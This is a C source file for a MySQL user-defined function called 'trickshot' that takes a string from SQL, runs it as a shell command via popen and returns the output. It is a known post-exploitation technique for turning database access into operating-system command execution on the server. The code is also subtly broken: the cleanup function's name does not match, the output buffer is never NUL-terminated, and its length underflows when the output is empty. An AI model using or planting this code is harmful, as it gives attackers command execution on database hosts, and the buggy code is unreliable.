#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#include <mysql.h>


my_bool trickshot_init(UDF_INIT *initid, UDF_ARGS *args, char *message){
    if(args->arg_count != 1 || args->arg_type[0] != STRING_RESULT){
        strcpy(message, "Incorrect usage...");
        return 1;
    }
    initid->ptr = malloc(1);
    return 0;
}

char *trickshot(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length, char *is_null, char *error){
    char *cmd = args->args[0];
    size_t cmd_len = strlen(cmd);
    FILE *fd;
    char *safe_command = malloc(cmd_len + 5);
    strcpy(safe_command, (const char *)(cmd));
    strcat(safe_command, " 2>&1");
    fd = popen(safe_command, "r");

    char buffer[256];
    size_t chread;
    /* String to store entire command contents in */
    size_t comalloc = 1;
    size_t comlen   = 0;
 
    /* Use fread so binary data is dealt with correctly */
    while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
        if (comlen + chread >= comalloc) {
            comalloc += chread;
            initid->ptr = realloc(initid->ptr, comalloc);
        }
        memmove(initid->ptr + comlen, buffer, chread);
        comlen += chread;
    }
    pclose(fd);
    free(safe_command);
    *length = comlen-1;
    return initid->ptr;
}

void sys_exec_deinit(UDF_INIT *initid){
    free(initid->ptr);
}

